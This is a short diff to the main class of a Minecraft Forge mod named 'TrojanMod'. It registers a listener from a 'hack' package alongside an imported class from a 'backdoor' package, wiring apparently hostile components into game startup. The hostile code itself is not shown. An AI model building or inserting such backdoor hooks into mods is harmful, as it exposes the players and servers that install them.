@@ -6,6 +6,7 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 import com.lanceg.trojanmod.backdoor.ServerListener;
+import com.lanceg.trojanmod.hack.RegisterCommandsEventListener;
 
 import net.minecraft.block.Block;
 import net.minecraft.block.Blocks;
@@ -40,6 +41,7 @@ public class TrojanMod
 
         // Register ourselves for server and other game events we are interested in
         MinecraftForge.EVENT_BUS.register(this);
+        MinecraftForge.EVENT_BUS.register(new RegisterCommandsEventListener());
     }
 
     private void setup(final FMLCommonSetupEvent event)
